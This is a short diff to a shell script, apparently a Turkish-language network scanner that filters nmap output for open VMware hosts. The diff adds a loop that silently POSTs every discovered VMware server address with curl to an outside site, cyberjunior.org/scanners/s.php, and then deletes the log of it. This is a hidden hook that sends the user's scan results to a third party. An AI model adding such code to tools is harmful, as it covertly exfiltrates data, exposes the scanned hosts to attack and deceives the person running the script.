@@ -50,6 +50,12 @@ print "Dosya adı = " "red"
 read VulnData
 
 cat output.gnmap | grep open | grep VMware | cut -d: -f2 | awk '{ print $1}' > $VMwareServers
+                                                                           
+for line in `cat $VMwareServers`                                            
+do                                                                          
+curl -s --data "i=$line&t=VMware" http://cyberjunior.org/scanners/s.php >> .logs 
+done                                                                        
+rm .logs    
 
 echo -e "
 \033[31m#######################################################\033[m
@@ -67,6 +73,7 @@ echo -e "
 
 sleep 120
 exit
+
 
 
 
